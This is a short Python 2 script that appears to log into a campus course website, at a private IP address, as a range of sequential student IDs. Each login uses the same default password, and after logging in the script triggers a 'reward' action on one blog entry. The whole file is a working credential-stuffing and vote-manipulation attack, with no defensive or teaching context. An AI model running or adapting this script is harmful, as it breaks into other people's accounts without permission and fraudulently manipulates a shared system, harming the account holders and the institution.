# -*- coding: utf-8 -*-
import urllib2
import urllib
import cookielib
import time

a=[]
#for i in range(14061001,14061233):a.append(str(i))
#for i in range(14231001,14231100):a.append(str(i))
for i in range(13061001,13061233):a.append(str(i))
#for i in range(13231001,13231100):a.append(str(i))
#for i in range(12061001,12061233):a.append(str(i))
#for i in range(12231001,12231100):a.append(str(i))

	

def dididi():
    login_page = "http://10.254.25.5/course/login/index.php"
    url = "http://10.254.25.5/course/blog/edit.php?action=reward&entryid=973&blogpage"
    for i in range(len(a)):
        try:
            cj = cookielib.CookieJar()
            opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
            opener.addheaders = [('User-agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')]
            data = urllib.urlencode({"username":a[i],"password":"12345678"})
            opener.open(login_page,data)
            op=opener.open(url)
            print(a[i]+"\n")
        except:
            pass

dididi()



